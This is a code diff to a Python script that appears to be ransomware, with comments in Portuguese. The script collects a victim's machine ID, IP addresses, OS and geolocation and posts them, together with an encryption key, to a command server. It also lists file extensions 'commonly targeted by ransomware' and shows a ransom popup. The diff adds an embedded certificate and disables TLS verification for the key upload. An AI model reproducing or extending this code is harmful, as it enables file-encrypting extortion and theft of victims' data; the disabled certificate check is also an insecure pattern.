@@ -8,9 +8,17 @@ import requests
 import json
 import random
 import string
-import hashlib
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import subprocess
+
+
+# Função para criar o arquivo cert.pem
+def create_cert_file(cert_content):
+    cert_path = "cert.pem"
+    with open(cert_path, "w") as cert_file:
+        cert_file.write(cert_content)
+    return cert_path
+
 
 # Função para criar o arquivo teste.txt
 def create_test_file():
@@ -40,7 +48,7 @@ def show_popup():
     else:  # Supondo que qualquer outro SO seja Linux
         show_popup_linux(test_file)
 
-SERVER_URL = "http://192.168.74.123:5000"
+SERVER_URL = "https://192.168.15.15:5000"
 
 def generate_key():
     return Fernet.generate_key()
@@ -130,7 +138,7 @@ def get_public_ip():
     return public_ip
 
 
-def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, public_ip):
+def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, public_ip, cert_content):
     location = get_geolocation() # Obtém a localização da máquina
     data = {
         "machine_id": machine_id,
@@ -141,11 +149,19 @@ def send_key_to_server(machine_id, key, machine_name, ip_address, os_info, publi
         "os_info": os_info,
         "location": location
     }
-    response = requests.post(f"{SERVER_URL}/api/keys/add", json=data)
-    if response.status_code == 200:
-        print("Chave enviada com sucesso")
-    else:
-        print("Falha ao enviar a chave")
+    
+    # Cria o arquivo cert.pem com o conteúdo baixado
+    cert_path = create_cert_file(cert_content)
+    
+    try:
+        # Usando o caminho local do certificado baixado
+        response = requests.post(f"{SERVER_URL}/api/keys/add", json=data, verify=False)
+        if response.status_code == 200:
+            print("Chave enviada com sucesso.")
+        else:
+            print(f"Falha ao enviar chave: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Erro ao enviar chave: {e}")
 
 def main():
     machine_id = generate_machine_id() # Gera o machine_id
@@ -154,7 +170,32 @@ def main():
     ip_address = get_ip_address() # Obtém o ip da máquina
     os_info = platform.platform() # Obtém o nome do sistema operacional
     public_ip = get_public_ip()
-    send_key_to_server(machine_id, key, machine_name, ip_address, public_ip, os_info)
+    
+    # Suponha que o conteúdo do certificado seja obtido de alguma fonte (como um servidor)
+    cert_content = """-----BEGIN CERTIFICATE-----
+MIIDVTCCAj2gAwIBAgIUFCLRvsVfQ5IbovyEI7FxGNXpv3owDQYJKoZIhvcNAQEL
+BQAwUzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAkNBMRYwFAYDVQQHDA1TYW4gRnJh
+bmNpc2NvMQswCQYDVQQLDAJJVDESMBAGA1UEAwwJVEVTVEUuQ09NMB4XDTI0MDkw
+OTIyMTA0NFoXDTI1MDkwOTIyMTA0NFowUzELMAkGA1UEBhMCVVMxCzAJBgNVBAgM
+AkNBMRYwFAYDVQQHDA1TYW4gRnJhbmNpc2NvMQswCQYDVQQLDAJJVDESMBAGA1UE
+AwwJVEVTVEUuQ09NMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA61wo
+IINBKwv/nH+Nn/mMcqwVWDEWVV11wkg1AN4h6FuHn9hR90yfDqWCR/aHoldmvzIS
+E+AFTRJXV7CeoWzpXAsrE5uCfBCCjRuqZpnJQLZ0nO2no+nQseVXFfhVbpry+qG0
+aoc6p0D6skqP0qe9PdckFkffgey4Kj58vBBlfZvU07lLsn9uSk1Xg3PmtkfIud5d
+sRyp7jLxT7vyt7S25ovZ1aiGQMik5hL9hkH6MLq2Y3FUph7/h+JB8fnSn5KawHsH
+/tK1W8bGS/QbtcHxDx4vlRlMoqfbH1eqmOjv7PzrEqJFNHbs8Iwhk5JKdp2D/Ic8
+7qE0FZWjN5CJ5AiUOwIDAQABoyEwHzAdBgNVHQ4EFgQUu4SaEi0MNYmVBRT7wE9F
+GVhUis4wDQYJKoZIhvcNAQELBQADggEBAIdo3F/yruDC/HuuQuEEcfUJ0iiaLu+9
+WcNH0RGT3SvXjk89Jw1j9YWz5j7ul2hYvgiYfxKtaAb2b1pYPMakU+LIaWH0cd8J
+0kYOohJ7+zfikYz/73X35VdzhACnjnL9vwJVDPaav6c1KN9l2qq6YyEqp6tQMGGT
+GFSE3UgYG6qRDrBHdS2v2NFQz+Zi2yBSnS0IF8HBkDJB2iXtch5WI1uOZLMqB68y
+zkhPAkLgRcH3ODcslzNZzKrVzEflOPiWHcGDws8BSHykZI2H/NJ3Kf6DPHkcblO7
+mreuDD9EIpz8D2oQE/H3lBfW6jY+G+SwUHFtFNQ2xCShXNxFtg5tbBo=
+-----END CERTIFICATE-----"""
+
+
+
+    send_key_to_server(machine_id, key, machine_name, ip_address, public_ip, os_info, cert_content)
     
 
     # Extensões de arquivos comumente visados por ransomwares, incluindo arquivos de servidores
@@ -174,3 +215,4 @@ def main():
     show_popup()
 if __name__ == "__main__":
     main()
+
